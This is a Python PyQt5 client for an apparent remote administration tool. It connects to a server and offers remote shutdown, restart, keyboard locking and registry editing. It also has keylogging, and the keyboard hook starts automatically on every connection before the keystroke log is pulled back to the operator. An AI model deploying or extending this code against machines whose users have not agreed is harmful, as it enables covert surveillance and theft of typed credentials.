from PyQt5 import uic
import sys

from PyQt5.QtWidgets import QApplication, QDialog, QFileDialog, QMainWindow
from cv2 import sepFilter2D
from app.client.Data import Data
from app.client.packages.portal import *

class ClientFlow(QMainWindow):
    def __init__(self):
        super(ClientFlow, self).__init__()
        uic.loadUi('./ui/MainClient.ui', self)
        self.portal = Portal()
        self.connectFunc()
        self.aboutWindow = self.About(self)
        self.registryWindow = self.Registry(self.portal, self)
        self.data = Data()

    def updateUI(self):
        self.mac_addr.setText(self.data.mac_addr)

    def run(self):
        self.show()

    def updateAfterConnect(self):
        self.get_mac()
        self.portal.keyboard_hook()
        self.updateUI()
        

    def connectFunc(self):
        self.actionConnect.triggered.connect(self.connectServer)
        self.connect_btn.clicked.connect(self.connectServer)
        # when it disconnect the port will be in time wait state by TCP
        self.disconnect_btn.clicked.connect(self.disconnectServer)
        self.actionDisconnect.triggered.connect(self.disconnectServer)
        self.actionAbout.triggered.connect(self.about)
        self.actionShut_down.triggered.connect(self.portal.shut_down)
        self.actionLogout.triggered.connect(self.portal.log_out)
        self.actionSleep.triggered.connect(self.portal.sleep)
        self.actionRestart.triggered.connect(self.portal.restart)
        self.actionRegistry.triggered.connect(self.registry)
        self.actionHook.triggered.connect(self.portal.keyboard_hook)
        self.actionLock.triggered.connect(self.portal.keyboard_lock)
        self.actionUnlock.triggered.connect(self.portal.keyboard_unlock)
        self.actionUnhook.triggered.connect(self.keylogger)
        self.actionPrint.triggered.connect(self.keyloggerPrint)

    def keylogger(self):
        r = self.portal.keyboard_unhook()
        log = r.content().decode(protocol.MESSAGE_ENCODING)
        self.keylog.append(log)

    def keyloggerPrint(self):
        r = self.portal.keyboard_unhook()
        log = r.content().decode(protocol.MESSAGE_ENCODING)
        self.keylog.append(log)
        self.portal.keyboard_hook()

    def get_mac(self):
        r = self.portal.get_mac_address()
        self.data.mac_addr = r.content().decode(protocol.MESSAGE_ENCODING)
        self.statusbar.showMessage(r.status_message())
        

    class Registry(QDialog):        
        def __init__(self, portal: Portal = None, parent=None):
            super().__init__(parent)
            self.setParent(parent)
            uic.loadUi('./ui/Registry.ui', self)
            self.setWindowModality(1)
            self.connectFunc()
            self.portal = portal
            self.hide()

        def connectFunc(self):
            self.browser_file.clicked.connect(self.browser)
            self.send.clicked.connect(lambda: self.portal.send_registry_file(self.reg_data.toPlainText()))
            self.doit.clicked.connect(self.command)

        def command(self):
            path = self.path_key.text()
            data = self.data.text()
            value = self.value.text()
            type = self.type.currentText()

            opt = self.options.currentText()
            
            self.MODIFICATION_TYPE = [
                'Get value',
                'Set value',
                'Delete value',
                'Create key',
                'Delete key'
            ]
            self.status.setText(" ".join([opt, path, value, data, type]))
            opt = self.MODIFICATION_TYPE.index(opt)
            try:
                if opt == 0:
                    r = self.portal.get_registry(path)
                elif opt == 1:
                    r = self.portal.set_registry(path, value, type)
                elif opt == 2:
                    r = self.portal.delete_registry(path)
                elif opt == 3:
                    r = self.portal.create_registry_key(path)
                elif opt == 4:
                    r = self.portal.delete_registry(path)
                self.status.setText(r.content().decode(protocol.MESSAGE_ENCODING))
            except:
                pass

        def browser(self):
            self.status.setText("Open file")
            try:
                file_name = QFileDialog.getOpenFileName()[0]
                self.path.clear()
                self.path.insert(file_name)
                cnt = open(file_name).read()
                self.reg_data.clear()
                self.reg_data.append(cnt)
            except:
                pass
            

    def registry(self):
        self.statusbar.showMessage('Registry dialog open.')
        self.registryWindow.show()

    class About(QDialog):
        def __init__(self, parent=None):
            super().__init__(parent)
            self.setParent(parent)
            uic.loadUi('./ui/About.ui', self)
            self.setWindowModality(1)
            self.hide()

    def about(self):
        self.statusbar.showMessage('Info about this application.')
        self.aboutWindow.show()

    def connectServer(self):
        ip, port = self.parseServerAddress()
        try:
            try:
                self.portal.connect(ip, port)
                self.ip_server.setDisabled(1)
                self.port_server.setDisabled(1)
                self.connect_btn.setDisabled(1)
                self.updateAfterConnect()
            except:
                raise ServerError("Server not start")
        except ServerError as e:
            self.statusbar.showMessage(str(e))

    def disconnectServer(self):
        self.ip_server.setEnabled(1)
        self.port_server.setEnabled(1)
        self.connect_btn.setEnabled(1)
        # maybe not have socket --> use try
        try:
            self.portal.disconnect()
        except:
            raise

    def parseServerAddress(self):
        ip = self.ip_server.text()
        port = self.port_server.text()
        return ip, int(port)

if __name__=="__main__":
    app = QApplication(sys.argv)
    client = ClientFlow()
    client.run()
    app.exec_()